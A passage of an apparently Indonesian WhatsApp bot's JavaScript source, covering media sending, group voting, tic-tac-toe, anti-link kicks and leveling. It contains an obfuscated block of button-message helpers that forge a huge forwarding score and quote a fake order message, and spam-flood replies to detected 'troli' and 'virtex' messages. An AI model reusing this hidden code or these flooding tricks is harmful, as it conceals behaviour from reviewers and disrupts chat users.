                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    Zeeone.sendMessage(to, media, type, { quoted: Ofc, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            } 
       async function sendFileFromUrl(from, url, caption, Ofc, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime.split("/")[0] === "gif"){
                return Zeeone.sendMessage(from, await getBuffer(url), MessageType.video, {caption: caption, quoted: Ofc, gifPlayback: true, mimetype: 'video/mp4', contextInfo: {"mentionedJid": men ? men : []}})
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
                return Zeeone.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: Ofc, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
            }
            if(mime.split("/")[0] === "audio"){
            	type = MessageType.audio
                mime = Mimetype.mp4Audio
                return Zeeone.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: Ofc, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
            }
            if(mime.split("/")[0] === "video"){
            	type = MessageType.video
                mime = 'video/mp4'
                return Zeeone.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: Ofc, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
            }
            if(mime.split("/")[0] === "image"){
            	return Zeeone.sendMessage(from, await getBuffer(url), image, {caption: caption, quoted: Ofc, contextInfo: {"mentionedJid": men ? men : []}})
            }
                }
        const textImg = (teks) => {
            return Zeeone.sendMessage(from, teks, text, {quoted: Ofc, thumbnail: thumbnail})
        }
        const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./src/sticker/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					Zeeone.sendMessage(to, media, sticker, Ofc)
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
					});
					});
				});
			}
			
			const sendFile = async(link, type, options) => {
				hasil = await getBuffer(link)
				Zeeone.sendMessage(from, hasil, type, options).catch(e => {
					fetch(link).then((hasil) => {
						Zeeone.sendMessage(from, hasil, type, options).catch(e => {
							Zeeone.sendMessage(from, { url : link }, type, options).catch(e => {
								reply('Error!')
								console.log(e)
							})
						})
					})
				})
			}
					if(isGroup && !isVote) {
							if (budy.toLowerCase() === 'vote'){
								let vote = JSON.parse(fs.readFileSync(`./database/voting/pvote/${from}.json`))
								let _votes = JSON.parse(fs.readFileSync(`./database/voting/vote/${from}.json`))  
								let fil = vote.map(v => v.participant)
								let id_vote = sender ? sender : `${owner_number}@s.whatsapp.net`
								if(fil.includes(id_vote)) {
									return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
									} else {
										vote.push({
											participant: id_vote,
											voting: '✅'
										})
										fs.writeFileSync(`./database/voting/pvote/${from}.json`,JSON.stringify(vote))
										let _p = []
										let _vote = `「   VOTING  」\n\n*Vote* @${_votes[0].votes.split('@')[0]}\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit` 
										for(let i = 0; i < vote.length; i++) {
											_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}`
											_p.push(vote[i].participant)
										}  
										_p.push(_votes[0].votes)
										mentions(_vote,_p,true)   
									}
								} else if (budy.toLowerCase() === 'devote'){
									const vote = JSON.parse(fs.readFileSync(`./database/voting/pvote/${from}.json`))
									let _votes = JSON.parse(fs.readFileSync(`./database/voting/vote/${from}.json`))  
									let fil = vote.map(v => v.participant)
									let id_vote = sender ? sender : `${owner_number}@s.whatsapp.net`
									if(fil.includes(id_vote)) {
										return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
										} else {
											vote.push({
												participant: id_vote,
												voting: '❌'
											})
										fs.writeFileSync(`./database/voting/pvote/${from}.json`,JSON.stringify(vote))
										let _p = []
										let _vote = `「   VOTING  」\n\n*Vote* @${_votes[0].votes.split('@')[0]}\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit` 
										for(let i = 0; i < vote.length; i++) {
											_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}`
											_p.push(vote[i].participant)
											}  
											_p.push(_votes[0].votes)
											mentions(_vote,_p,true)   
											}
										}
									}
					const getWin = async(board) => {
    var x = ["❌"]
    var o = ["⭕️"]

    // Horizontal
    if (board[0] == x && board[1] == x && board[2] == x) return x
    if (board[3] == x && board[4] == x && board[5] == x) return x
    if (board[6] == x && board[7] == x && board[8] == x) return x
    if (board[0] == o && board[1] == o && board[2] == o) return o
    if (board[3] == o && board[4] == o && board[5] == o) return o
    if (board[6] == o && board[7] == o && board[8] == o) return o

    // Silang
    if (board[0] == x && board[4] == x && board[8] == x) return x
    if (board[2] == x && board[4] == x && board[6] == x) return x
    if (board[0] == o && board[4] == o && board[8] == o) return o
    if (board[2] == o && board[4] == o && board[6] == o) return o

    // Vertikal
    if (board[0] == x && board[3] == x && board[6] == x) return x
    if (board[1] == x && board[4] == x && board[7] == x) return x
    if (board[2] == x && board[5] == x && board[8] == x) return x
    if (board[0] == o && board[3] == o && board[6] == o) return o
    if (board[1] == o && board[4] == o && board[7] == o) return o
    if (board[2] == o && board[5] == o && board[8] == o) return o
    return false
}

// function for generate board for x and o or number
const generateBoard = async(board) => {
    var texts = ""
    var count = 0
    for (var x of board) {
        if (count % 3 == 0) {
            texts += "\n               "
        }
        texts += x
        count += 1
    }
    return texts
}
const checkWin = (sender) => {
            let found = false
            for (let wn of _win) {
                if (wn.jid === sender) {
                    let winCounts = winawal - wn.win
                    if (winCounts <= 0) return Zeeone.sendMessage(from, `Anda belum pernah memainkan game tictactoe${enter}${enter}Jumlah kemenangan kamu didalam game *tictactoe* adalah: ${winCounts}`, text, { quoted: Ofc })
                    return `${winCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, win: 0 }
                _win.push(obj)
                fs.writeFileSync('./database/tttwin.json', JSON.stringify(_win))
                return `${winCounts}`
            }
        }
        const checkLose = (sender) => {
            let found = false
            for (let ls of _lose) {
                if (ls.jid === sender) {
                    let loseCounts = loseawal - ls.lose
                    if (loseCounts <= 0) return Zeeone.sendMessage(from, `Anda belum pernah memainkan game tictactoe${enter}${enter}Jumlah kemenangan kamu didalam game *tictactoe* adalah: ${winCounts}`, text, { quoted: Ofc })
                    return `${loseCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, lose: 0 }
                _lose.push(obj)
                fs.writeFileSync('./database/tttlose.json', JSON.stringify(_lose))
                return `${loseCounts}`
            }
        }
        if (tictactoe.hasOwnProperty(senderNumber) && ["Nyerah", "nyerah", "give up"].includes(budy) && !isCmd) {
        orangnye = sender
        teks = `@${orangnye.split("@")[0]} Menyerah${enter}_Yahaha_`
        return Zeeone.sendMessage(from, teks, text, {quoted:Ofc, contextInfo:{mentionedJid: [orangnye]}}).then(() => {
                        delete tictactoe[senderNumber]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync("./database/user/" + from + ".json");
        })
        }
       
        if (tictactoe.hasOwnProperty(senderNumber) && ["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(budy) && !isCmd) {
            var { enemy, mode, board, step } = tictactoe[senderNumber]
            if ([X, O].includes(board[Number(budy) - 1])) return await reply(`Angka ${budy} telah diisi`)
            var data = tictactoe[senderNumber]
            data["enemy"] = senderNumber
            mode = mode == X ? O : X
            data["mode"] = mode
            data["board"][Number(budy) - 1] = data["mode"]
            data["step"] += 1
            var player1 = enemy
            var player2 = senderNumber
            if (step % 2 == 0) {
                player1 = senderNumber
                player2 = enemy
            } else {
                mode = data["mode"] == X ? O : X
            }
            tictactoe[enemy] = data
            delete tictactoe[senderNumber]
            var teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}•> Player 1 : @${player1.split("@")[0]} (${mode})`
            mode = mode == X ? O : X
            var text2 = `${enter}${enter}•> Player 2 : @${player2.split("@")[0]} (${mode})`
            var test = `${enter}_ketik nyerah untuk menyerah_`
            board = await generateBoard(data["board"])
            var win = await getWin(data["board"])
            if (win) {
                teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}`
                if (win == mode) {
                    teks += `•> Lose : @${player1} 👻${enter}${enter}`
                    teks += board
                    teks += `${enter}${enter}•> Win : @${player2} 🎉${enter}_© WhatsApp Bot_`
                    return Zeeone.sendMessage(from, teks, text, {quoted:Ofc, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./database/user/' + from + '.json')
                        getWins(`${player2}@s.whatsapp.net`, 1)
                        getLose(`${player1}@s.whatsapp.net`, 1)
                    })
                } else {
                    teks += `•> Win : @${player1} 🎉${enter}${enter}`
                    teks += board
                    teks += `${enter}${enter}•> Lose : @${player2} 👻${enter}_© WhatsApp Bot_`
                    return Zeeone.sendMessage(from, teks, text, {quoted:Ofc, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./database/user/' + from + '.json')
                        getWins(`${player1}@s.whatsapp.net`, 1)
                        getLose(`${player2}@s.whatsapp.net`, 1)
                    })
                }
            }
            if (data["step"] == 9) {
                teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}`
                teks += `•> Draw : @${player1} 🦁${enter}${enter}`
                teks += board
                teks += `${enter}${enter}•> Draw : @${player2} 🐯${enter}_© WhatsApp Bot_`
                return Zeeone.sendMessage(from, teks, text, {quoted:Ofc, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                    delete tictactoe[enemy]
                    fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                    fs.unlinkSync('./database/user/' + from + '.json')
                })
            }
            player2 == senderNumber ? teks += tunjuk : text2 += tunjuk
            teks += "\n"
            teks += board
            teks += text2
            teks += test
            return Zeeone.sendMessage(from, teks, text, {quoted:Ofc, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
            })
        }
        if (fs.existsSync(`./temp/${from}.json`)) {
	tttSkuy = setTtt(`${from}`)
	if (sender == `${tttSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (tttSkuy.status) return reply(`Game telah dimulai sebelumnya!`)
		tttSkuy.status = true
		rand0m = [ tttSkuy.Z, tttSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
		nantang = O
                    pelawan = X
                
                var board = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
                var penantang = `${tttSkuy.Z}@s.whatsapp.net`
                var lawan = `${tttSkuy.Y}@s.whatsapp.net`
                tesk = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}•> Player 1 : @${penantang.split("@")[0]} (${nantang}) ${tunjuk}${enter}`
                var count = 0
                for (var x of board) {
                    if (count % 3 == 0) {
                        tesk += "\n               "
                    }
                    tesk += x
                    count += 1
                }
                tesk += `${enter}${enter}•> Player 2 : @${lawan.split("@")[0]} (${pelawan})${enter}_© WhatsApp Bot_`
                return Zeeone.sendMessage(from, tesk, text, {quoted:Ofc, contextInfo:{mentionedJid: [penantang, lawan]}}).then(() => {
                    var data = {}
                    data["enemy"] = lawan.split("@")[0]
                    data["mode"] = pelawan
                    data["board"] = board
                    data["step"] = 0
                    tictactoe[penantang.split("@")[0]] = data
                    fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                })
                fs.unlinkSync("./database/user/" + from + ".json");
	} else if (sender == `${tttSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		Zeeone.sendMessage(from, `「 *GAME TICTACTOE REJECTED* 」\n\n• @${tttSkuy.Y} yahaha wahyu`, text, {quoted: Ofc, contextInfo: { mentionedJid: [tttSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./database/user/" + from + ".json");
	}
}
					if (isGroup && isAntro && m.message && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
						reply(`Troli Detected\n` + require('util').format(m.key))
						Zeeone.sendMessage(from, '*TANDAI TELAH DI BACA!!*\n'.repeat(300), text)
						await Zeeone.modifyChat(m.chat, 'delete', {
							includeStarred: false
						})
					}
					function _0x15bd(){const _0x4a616d=['ndm5ndiXngDSruTdDG','ChjLCgfYzu1LCW','yNv0Dg9UC01LCW','nuDst2fzta','nJa2ndy3mMD1t2PNqG','Bg9JyxrPB25nzq','yNv0Dg9UCW','AxngB3j3yxjKzq','zxnZywDL','Aw1Hz2vnzxnZyq','CxvVDgvK','mtKYmdiWmeLbBKnMtG','AgvHzgvYvhLWzq','mZK2mZCYndbqEhrYrwi','y29UDgvUDfrLEa','zM9VDgvYvgv4Da','zxbOzw1LCMfStq','vLvzAhm','C2fNzq','DMLKzw9nzxnZyq','mtHdt0HyC0e','Bg9JyxrPB24','BwvZC2fNzq','mZCWotHfr3nSs08','mtG2q1vMAKLw','C2vUze1LC3nHzW','y29UDgv4DeLUzG','C3nHz2u','zM9YD2fYzgLUzW','q3jKAfi','u2nVCMu','DMLKzw8','C2vUzevWAgvTzq','nJi0mJe3ywvwt2rN','mJG5mta0ovnqDgn3zG'];_0x15bd=function(){return _0x4a616d;};return _0x15bd();}function _0x3a78(_0x30e979,_0x325a7b){const _0x2ff33b=_0x15bd();return _0x3a78=function(_0x26cb10,_0x34ba20){_0x26cb10=_0x26cb10-(-0x10bc+-0x1*0xc26+0x1e96);let _0xcdaf30=_0x2ff33b[_0x26cb10];if(_0x3a78['xXYjVt']===undefined){var _0x39020b=function(_0x57dae7){const _0x18f90b='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x30aa9d='',_0x264111='';for(let _0x12fe29=0x31*-0x7+0x20c1+0xfb5*-0x2,_0x25fb38,_0x2c726a,_0x7e39b3=-0x15c8*-0x1+0x1*-0x389+0xad*-0x1b;_0x2c726a=_0x57dae7['charAt'](_0x7e39b3++);~_0x2c726a&&(_0x25fb38=_0x12fe29%(-0x1116+0x2d*-0x1+0x1147)?_0x25fb38*(-0x5df+-0xb4b+-0x6*-0x2e7)+_0x2c726a:_0x2c726a,_0x12fe29++%(0x60b+0x4*-0x20+-0x587))?_0x30aa9d+=String['fromCharCode'](-0x2343+-0x944+0x2d86&_0x25fb38>>(-(-0xa1*0x37+0x2*-0xd37+0x3d07*0x1)*_0x12fe29&0x1e8f+0x2540+-0x43c9)):0x73*0x2b+-0x7f*0x31+0x4fe){_0x2c726a=_0x18f90b['indexOf'](_0x2c726a);}for(let _0x2b306c=-0xcd7*-0x3+0x1*-0x15eb+0x2*-0x84d,_0x374460=_0x30aa9d['length'];_0x2b306c<_0x374460;_0x2b306c++){_0x264111+='%'+('00'+_0x30aa9d['charCodeAt'](_0x2b306c)['toString'](-0x57e+-0x1750+0x1cde))['slice'](-(-0x7*0xd3+0x18bd+-0x12f6));}return decodeURIComponent(_0x264111);};_0x3a78['xjeAQH']=_0x39020b,_0x30e979=arguments,_0x3a78['xXYjVt']=!![];}const _0x506ebb=_0x2ff33b[0x19df*0x1+0xd3b+-0x271a],_0x56c83c=_0x26cb10+_0x506ebb,_0x55aadc=_0x30e979[_0x56c83c];return!_0x55aadc?(_0xcdaf30=_0x3a78['xjeAQH'](_0xcdaf30),_0x30e979[_0x56c83c]=_0xcdaf30):_0xcdaf30=_0x55aadc,_0xcdaf30;},_0x3a78(_0x30e979,_0x325a7b);}(function(_0x31d2dd,_0x5ce1fa){function _0x470b1b(_0x11f05b,_0x404811,_0xba21fd,_0x283712){return _0x3a78(_0x283712-0x331,_0x404811);}function _0x17c1d0(_0x35bb5f,_0x259bc8,_0xe8fe70,_0x139ace){return _0x3a78(_0x35bb5f-0x3a9,_0x139ace);}const _0x3ca057=_0x31d2dd();while(!![]){try{const _0x3ba202=-parseInt(_0x17c1d0(0x578,0x587,0x57c,0x578))/(-0xb*-0x2d5+-0x6b*0x55+0x3b*0x13)+-parseInt(_0x470b1b(0x4fb,0x4ee,0x4e7,0x4f6))/(-0x2343+-0x15a0+0x38e5)*(parseInt(_0x470b1b(0x500,0x4e8,0x500,0x4f7))/(0x14*0x6a+-0x5b6*-0x2+0x47*-0x47))+-parseInt(_0x17c1d0(0x57e,0x581,0x580,0x579))/(-0x1*-0x142f+-0xc2*0x16+0xb3*-0x5)+-parseInt(_0x470b1b(0x506,0x4fb,0x513,0x505))/(-0xa*-0x223+-0xa59+-0xb00)*(parseInt(_0x470b1b(0x507,0x4f1,0x4fd,0x502))/(-0x1*-0x2319+-0x1ad0+-0x843))+parseInt(_0x17c1d0(0x579,0x57d,0x56f,0x57e))/(-0x23d2+0x13*-0x1e8+0x3cb*0x13)+-parseInt(_0x470b1b(0x4eb,0x4f3,0x4e7,0x4ea))/(0x6f+-0x80d+0x7a6)*(-parseInt(_0x17c1d0(0x56b,0x579,0x55d,0x57b))/(-0x7+-0x1085+0x1095))+parseInt(_0x17c1d0(0x564,0x554,0x555,0x555))/(-0xf4d+-0x1101*0x2+-0x3*-0x1073);if(_0x3ba202===_0x5ce1fa)break;else _0x3ca057['push'](_0x3ca057['shift']());}catch(_0x53178a){_0x3ca057['push'](_0x3ca057['shift']());}}}(_0x15bd,-0x1134c3+-0x12f38+0x9c*0x3310));const sendButMessage=async(_0xcdaf30,_0x39020b,_0x506ebb,_0x56c83c=[],_0x55aadc={})=>{const _0x57dae7={};_0x57dae7[_0x1d5f44(0x4bd,0x4ae,0x4b9,0x4c0)+'t']=_0x39020b,_0x57dae7['footerText']=_0x506ebb,_0x57dae7['buttons']=_0x56c83c;function _0x1d5f44(_0x2d64d7,_0x4017d1,_0x2c29b4,_0xc85f76){return _0x3a78(_0xc85f76-0x304,_0x2d64d7);}_0x57dae7['headerType']=0x1;function _0x1c301f(_0x292107,_0xc65452,_0x3f4208,_0x45264d){return _0x3a78(_0x292107-0x1cc,_0x3f4208);}buttonMessage=_0x57dae7;const _0x18f90b={};_0x18f90b[_0x1c301f(0x396,0x390,0x3a5,0x388)+_0x1d5f44(0x4c3,0x4d5,0x4cc,0x4d0)]=0x3b9aca00,_0x18f90b[_0x1c301f(0x381,0x38e,0x392,0x38c)+'d']=!![];const _0x30aa9d={};_0x30aa9d[_0x1c301f(0x394,0x387,0x397,0x3a3)+'o']=_0x18f90b,_0x30aa9d[_0x1c301f(0x384,0x38b,0x374,0x38d)]=ftroli,_0x30aa9d[_0x1c301f(0x39a,0x38c,0x397,0x3a9)+'ral']=!![],Zeeone[_0x1d5f44(0x4cc,0x4bc,0x4bf,0x4cb)+'e'](_0xcdaf30,buttonMessage,MessageType['buttonsMes'+_0x1d5f44(0x4c5,0x4b5,0x4bd,0x4c4)],_0x30aa9d);},sendButLocation=async(_0x264111,_0x12fe29,_0x25fb38,_0x2c726a,_0x7e39b3=[],_0x2b306c={})=>{const _0x374460={};_0x374460[_0x29a0a2(-0x14f,-0x14e,-0x159,-0x150)]=_0x384fd4(0x582,0x593,0x583,0x590)+'essage';const _0x52ce31=_0x374460;kma=_0x2c726a;function _0x29a0a2(_0x1de188,_0x272ab0,_0xba7e85,_0x2444c8){return _0x3a78(_0x272ab0- -0x30d,_0x2444c8);}const _0x30a457=await Zeeone[_0x29a0a2(-0x140,-0x13b,-0x13d,-0x148)+'sage'](_0x264111,kma,MessageType[_0x384fd4(0x587,0x584,0x577,0x593)],{'thumbnail':kma});function _0x384fd4(_0x38b131,_0x326c4f,_0x3ddf4e,_0x3610fb){return _0x3a78(_0x38b131-0x3c4,_0x3ddf4e);}mhan=_0x30a457['message'][_0x52ce31['VUYhs']]?_0x30a457[_0x384fd4(0x588,0x57e,0x57a,0x598)][_0x384fd4(0x582,0x584,0x571,0x593)+_0x384fd4(0x57a,0x58a,0x570,0x579)]:_0x30a457;const _0x3cc2f0={};_0x3cc2f0[_0x29a0a2(-0x147,-0x137,-0x135,-0x129)+_0x384fd4(0x58d,0x58d,0x58b,0x59d)]=mhan['message'][_0x29a0a2(-0x12f,-0x137,-0x133,-0x13f)+'ssage'],_0x3cc2f0['contentTex'+'t']=_0x12fe29,_0x3cc2f0[_0x29a0a2(-0x148,-0x150,-0x149,-0x14f)]=_0x25fb38,_0x3cc2f0['buttons']=_0x7e39b3,_0x3cc2f0[_0x29a0a2(-0x14a,-0x153,-0x15d,-0x158)]=0x6,buttonMessages=_0x3cc2f0,Zeeone[_0x29a0a2(-0x145,-0x146,-0x137,-0x157)+'e'](_0x264111,buttonMessages,MessageType[_0x29a0a2(-0x138,-0x13a,-0x12a,-0x12e)+'sage'],_0x2b306c);},sendButVideo=async(_0x310a69,_0x5353c3,_0x30c2a2,_0x34c8ab,_0x4544ce=[],_0x547caf={})=>{kma=_0x34c8ab;const _0x296dd6=await Zeeone[_0x557381(0xc2,0xa7,0xa4,0xb2)+_0x557381(0xa6,0xb2,0x9f,0xa0)](_0x310a69,kma,MessageType[_0x557381(0xb4,0xb7,0xa5,0xad)]);mhan=_0x296dd6[_0x4b5073(-0x1c9,-0x1be,-0x1bd,-0x1be)][_0x4b5073(-0x1cf,-0x1c3,-0x1ca,-0x1dc)+_0x4b5073(-0x1d7,-0x1e2,-0x1c7,-0x1d2)]?_0x296dd6[_0x4b5073(-0x1c9,-0x1b7,-0x1c3,-0x1d6)]['ephemeralM'+_0x557381(0xa6,0x9d,0x9e,0x96)]:_0x296dd6;const _0x24a55e={};_0x24a55e['videoMessa'+'ge']=mhan['message'][_0x4b5073(-0x1cc,-0x1ca,-0x1db,-0x1c8)+'ge'],_0x24a55e[_0x4b5073(-0x1d1,-0x1cb,-0x1d6,-0x1ce)+'t']=_0x5353c3,_0x24a55e['footerText']=_0x30c2a2,_0x24a55e[_0x4b5073(-0x1d9,-0x1e3,-0x1e7,-0x1db)]=_0x4544ce,_0x24a55e[_0x4b5073(-0x1d3,-0x1da,-0x1cc,-0x1df)]=0x5;function _0x4b5073(_0x16d392,_0x812d8e,_0x4ade19,_0x7f4e08){return _0x3a78(_0x16d392- -0x38d,_0x4ade19);}const _0x28d202=_0x24a55e;function _0x557381(_0x3a41b7,_0x5e23a9,_0x49782a,_0x1a5e0b){return _0x3a78(_0x1a5e0b- -0x120,_0x5e23a9);}Zeeone['sendMessag'+'e'](_0x310a69,_0x28d202,MessageType[_0x557381(0xaa,0xa6,0xbf,0xb3)+_0x4b5073(-0x1cd,-0x1d4,-0x1cb,-0x1de)],_0x547caf);},sendButImage=async(_0x13a019,_0xad7ff4,_0x1aabc6,_0x3a7b1b,_0x3e42f9=[],_0x73d842={})=>{const _0x18c916={};function _0x50ef70(_0x3942c5,_0x19de27,_0xe2a19c,_0x3a4b06){return _0x3a78(_0x3a4b06-0x3c4,_0x3942c5);}_0x18c916[_0x50ef70(0x591,0x59c,0x583,0x58f)]=_0x19d100(0x59d,0x593,0x59a,0x592)+'essage';const _0x28f30f=_0x18c916;kma=_0x3a7b1b;const _0x526640=await Zeeone[_0x19d100(0x5af,0x5a7,0x5a8,0x5b3)+_0x19d100(0x5a2,0x595,0x58a,0x59f)](_0x13a019,kma,MessageType['video']);mhan=_0x526640[_0x50ef70(0x59a,0x599,0x57a,0x588)][_0x28f30f[_0x50ef70(0x597,0x587,0x59c,0x58f)]]?_0x526640[_0x19d100(0x59f,0x599,0x59e,0x590)][_0x19d100(0x59b,0x593,0x596,0x584)+_0x50ef70(0x586,0x56a,0x56c,0x57a)]:_0x526640;const _0x644457={};function _0x19d100(_0x4e7424,_0x1530ac,_0x4c93b7,_0x2c3952){return _0x3a78(_0x1530ac-0x3d5,_0x4c93b7);}_0x644457[_0x50ef70(0x586,0x58d,0x579,0x57b)+'ge']=mhan[_0x50ef70(0x586,0x58d,0x591,0x588)][_0x19d100(0x593,0x58c,0x58e,0x585)+'ge'],_0x644457['contentTex'+'t']=_0xad7ff4,_0x644457[_0x50ef70(0x589,0x592,0x58b,0x581)]=_0x1aabc6,_0x644457[_0x19d100(0x595,0x589,0x597,0x589)]=_0x3e42f9,_0x644457[_0x50ef70(0x56d,0x58a,0x570,0x57e)]=0x4,buttonMessages=_0x644457,Zeeone['sendMessag'+'e'](_0x13a019,buttonMessages,MessageType['buttonsMes'+'sage'],_0x73d842);};
					if(isCmd && isBanned) return sendButMessage(from, `Maaf Nomor Kamu Telah Di Banned. Silahkan Hubungi Owner Untuk Membuka Banned Kamu`, `Klik Button Di Bawah !`, [{buttonId: `owner`,buttonText: {displayText: `👨‍💻 Owner`,},type: 1,}]);
					for (let setikerr of setiker){
						if (budy === setikerr){
						buffer = fs.readFileSync(`./database/stick/${setikerr}.webp`)
						Zeeone.sendMessage(from, buffer, sticker, {quoted: Ofc})
						}
					}
					for (let audionyee of audionye){
						if (budy === audionyee){
						buffer = fs.readFileSync(`./database/audio/${audionyee}.mp3`)
						Zeeone.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: Ofc, ptt: true })
						}
					}
					for (let imagenyee of audionye){
						if (budy === imagenyee){
						buffer = fs.readFileSync(`./database/image/${imagenyee}.jpg`)
						Zeeone.sendMessage(from, buffer, image, {quoted: Ofc })
						}
					}
					for (let videonyee of videonye){
						if (budy === videonyee){
						buffer = fs.readFileSync(`./database/video/${videonyee}.mp4`)
						Zeeone.sendMessage(from, buffer, video, {quoted: Ofc })
						}
					}
					if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
						if (budy.match(/(https:\/\/chat.whatsapp.com)/gi)) {
							sendButMessage(from, ` *GROUP LINK DETECTED*\n\nMaaf Kamu Akan Di Kick Dari Group Ini!`, `Klik Di Bawah Untuk Mematikan`, [
							{
							buttonId: `antilink off`,
							buttonText: {
								displayText: `🔖 DISABLE ANTILINK`,
								},
								type: 1,
								}]);
							Zeeone.groupRemove(from, [sender])
						}
					}
					if (budy.length > 10000) {
						if (!itsMe) return
						if (m.isBaileys) return
							Zeeone.modifyChat(m.chat, 'delete', {
							includeStarred: false
						})
						Zeeone.sendMessage(from, `「 *VIRTEX DETECTED* 」 `, text, {quoted: Ofc})
						Zeeone.sendMessage(from, '*TANDAI TELAH DI BACA!!*\n'.repeat(300), text)
					}
					if (!m.isBaileys && isGroup && isBadword && !isOwner && !isGroupAdmins && !Ofc.key.fromMe){
						for (let kasar of badword){
							if (chats.toLowerCase().includes(kasar)){
								if (isCountKasar(sender, senbadword)){
									if (!isBotGroupAdmins) return reply(`Kamu beruntung karena bot bukan admin`)
									sendButMessage(from, `*ANTI BADWORD*\n\nHai ${pushname}\nSepertinya kamu sudah berkata kasar lebih dari 2x, maaf kamu akan di kick`, `Klik Di Bawah Untuk Mematikan`, [
									{
										buttonId: `antibadword off`,
										buttonText: {
											displayText: `🔖 DISABLE ANTI BADWORD`,
											},
											type: 1,
											}]);
									Zeeone.groupRemove(from, [sender])
									delCountKasar(sender, senbadword)
									} else {
										addCountKasar(sender, senbadword)
										reply(`Kamu terdeteksi berkata kasar\nJangan ulangi lagi atau kamu akan dikick`)
									}
								}
							}
						}
						Zeeone.chatRead(from, "read")
					_sewa.expiredCheck(Zeeone, sewa)
					
					const levelRole = getLevelingLevel(sender)
					var role = 'Bronze 1'
					if (levelRole <= 2) {
						role = 'Bronze 1'
						} else if (levelRole <= 10) {
							role = 'Bronze 2'
							} else if (levelRole <= 20) {
								role = 'Bronze 3'
								} else if (levelRole <= 30) {
									role = 'Bronze 4'
									} else if (levelRole <= 40) {
										role = 'Bronze 5'
										} else if (levelRole <= 70) {
											role = 'Silver 1'
											} else if (levelRole <= 85) {
												role = 'Silver 2'
												} else if (levelRole <= 95) {
													role = 'Silver 3'
													} else if (levelRole <= 105) {
														role = 'Silver 4'
														} else if (levelRole <= 125) {
															role = 'Silver 5'
															} else if (levelRole <= 150) {
																role = 'Gold 1'
																} else if (levelRole <= 170) {
																	role = 'Gold 2'
																	} else if (levelRole <= 190) {
																		role = 'Gold 3'
																		} else if (levelRole <= 210) {
																			role = 'Gold 4'
																			} else if (levelRole <= 230) {
																				role = 'Gold 5'
																				} else if (levelRole <= 260) {
																					role = 'Platinum 1'
																					} else if (levelRole <= 290) {
																						role = 'Platinum 2'
																						} else if (levelRole <= 320) {
																							role = 'Platinum 3'
